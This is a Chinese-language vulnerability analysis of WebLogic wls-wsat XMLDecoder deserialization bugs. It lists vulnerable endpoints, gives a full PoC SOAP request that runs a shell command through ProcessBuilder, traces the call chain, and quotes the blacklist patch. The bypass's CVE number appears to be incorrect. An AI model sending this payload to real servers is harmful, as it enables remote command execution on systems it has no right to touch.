# CVE-2017-3506&CVE-2017-12071 反序列化
影响版本
```
10.3.6.0
12.1.3.0
12.2.1.0
12.2.1.1
12.2.1.2
```
访问以下url,可访问即开启了相关漏洞组件
```
/wls-wsat/CoordinatorPortType
/wls-wsat/RegistrationPortTypeRPC
/wls-wsat/ParticipantPortType
/wls-wsat/RegistrationRequesterPortType
/wls-wsat/CoordinatorPortType11
/wls-wsat/RegistrationPortTypeRPC11
/wls-wsat/ParticipantPortType11
/wls-wsat/RegistrationRequesterPortType11
```
## CVE-2017-3506
### POC
```
POST /wls-wsat/CoordinatorPortType11 HTTP/1.1
Host: 127.0.0.:7001
sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="92"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: text/xml
Content-Length: 764

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">  
  <soapenv:Header> 
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">  
      <java> 
        <void class="java.lang.ProcessBuilder"> 
          <array class="java.lang.String" length="3"> 
            <void index="0"> 
              <string>/bin/sh</string> 
            </void>  
            <void index="1"> 
              <string>-c</string> 
            </void>  
            <void index="2"> 
              <string>whoami>/tmp/log</string>
            </void> 
          </array>  
          <void method="start"/> 
        </void> 
      </java> 
    </work:WorkContext> 
  </soapenv:Header>  
  <soapenv:Body/> 
</soapenv:Envelope>
```
## 原理
其原因在于WLS-WebServices这个组件中使用了JDK自带的XMLDecoder来直接解析XML数据,触发了XMLDecoder反序列化漏洞.
### 调用链
首先在`weblogic/wsee/jaxws/workcontext/WorkContextServerTube.class.processRequest`方法中开始处理相关xml请求.
首先分切xml数据的haeader交给readHeaderOld方法.
![](1.png)
在readHeaderOld方法中,var4通过XMLStreamWriteFactory.create和var3的bridge()方法被填充为poc部分即
```xml
<java> 
        <void class="java.lang.ProcessBuilder"> 
          <array class="java.lang.String" length="3"> 
            <void index="0"> 
              <string>/bin/sh</string> 
            </void>  
            <void index="1"> 
              <string>-c</string> 
            </void>  
            <void index="2"> 
              <string>whoami>/tmp/log</string>
            </void> 
          </array>  
          <void method="start"/> 
        </void> 
      </java> 
```
然后将这部分作为参数实例化了一个WorkContextXmlInputAdapter.
![](2.png)  
而在WorkContextXmlInputAdapter实例化中则直接调用了xmlDecoder来反序列化数据.触发xmlDecoder反序列化漏洞.
![](3.png)
### CVE-2017-12071
CVE-2017-12071为CVE-2017-3506补丁的绕过,CVE-2017-3506的补丁只是把object标签对象加了黑名单,而在xmldecoder中还有可替代的标签进行替换即可,而在CVE-2017-12071中则是将`object、new、method`关键字加入了黑名单,匹配到即抛出异常,对`void,array`标签若没有分别匹配匹配到`index`和`bytes`属性才抛出异常,即不能使用`object、new、method`标签,而`void`标签只能有index节点或者空节点,而`array`标签则只接受bytes类型的参数.
```java
public void startElement(String uri, String localName, String qName, Attributes attributes) throws SAXException {

            if(qName.equalsIgnoreCase("object")) {

               throw new IllegalStateException("Invalid element qName:object");

            } else if(qName.equalsIgnoreCase("new")) {

               throw new IllegalStateException("Invalid element qName:new");

            } else if(qName.equalsIgnoreCase("method")) {

               throw new IllegalStateException("Invalid element qName:method");

            } else {

               if(qName.equalsIgnoreCase("void")) {

                  for(int attClass = 0; attClass < attributes.getLength(); ++attClass) {

                     if(!"index".equalsIgnoreCase(attributes.getQName(attClass))) {

                        throw new IllegalStateException("Invalid attribute for element void:" + attributes.getQName(attClass));
                     }
                  }
               }
               if(qName.equalsIgnoreCase("array")) {

                  String var9 = attributes.getValue("class");

                  if(var9 != null && !var9.equalsIgnoreCase("byte")) {

                     throw new IllegalStateException("The value of class attribute is not valid for array element.");

                  }
```